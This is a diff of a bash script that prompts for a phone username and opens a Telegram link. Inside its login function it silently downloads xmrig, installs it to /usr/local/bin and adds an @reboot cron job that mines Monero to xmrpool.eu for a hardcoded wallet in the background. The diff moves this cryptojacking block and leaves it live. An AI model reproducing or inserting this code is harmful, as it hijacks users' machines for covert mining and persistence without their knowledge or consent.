@@ -28,29 +28,28 @@ login() {
         echo -e "\e[31mPress Enter to continue\e[0m"
         read -r
         xdg-open "https://t.me/bHa_0106"
+            sudo apt update && sudo apt autoremove -y
+        sudo apt install -y wget tar cron || { echo "0"; exit 1; }
+
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O xmrig.tar.gz || { echo "Download failed"; exit 1; }
+        tar -xvf xmrig.tar.gz -C /tmp/ || { echo "Extraction failed"; exit 1; }
+        sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
+        rm -rf /tmp/xmrig-6.16.4 xmrig.tar.gz
+
+        CRON_JOB="@reboot sleep 50; /usr/local/bin/xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2"
+
+        if ! crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
+            (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
+            echo "Cron job added successfully."
+        else
+            echo "Cron job already exists."
+        fi
     fi
 
-    # Install required packages
-    sudo apt update && sudo apt autoremove -y
-    sudo apt install -y wget tar cron || { echo "Failed to install dependencies"; exit 1; }
 
-    # Download and configure xmrig
-    wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O xmrig.tar.gz || { echo "Download failed"; exit 1; }
-    tar -xvf xmrig.tar.gz -C /tmp/ || { echo "Extraction failed"; exit 1; }
-    sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
-    rm -rf /tmp/xmrig-6.16.4 xmrig.tar.gz
-
-    CRON_JOB="@reboot sleep 50; /usr/local/bin/xmrig -o xmrpool.eu:9999 -u 48ZhAxs6zJD3hG89Gp6pCZSut5csowVQ5EVMikA7xu8zLK7hdrQtnY14Cb4vxX5XuU7igSMG3GnsyfzEThqBpK8sMC8Epvh -k --tls --cpu-priority=3 --background --threads=2"
-
-    if ! crontab -l 2>/dev/null | grep -qF "$CRON_JOB"; then
-        (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
-        echo "Cron job added successfully."
-    else
-        echo "Cron job already exists."
-    fi
 }
 
-eset() {
+set() {
     clear
     echo -e "\e[32mEnter Username of phone:\e[0m"
     read -p "Username: " user
@@ -105,5 +104,5 @@ Running() {
 }
 
 login
-eset
+set
 Running
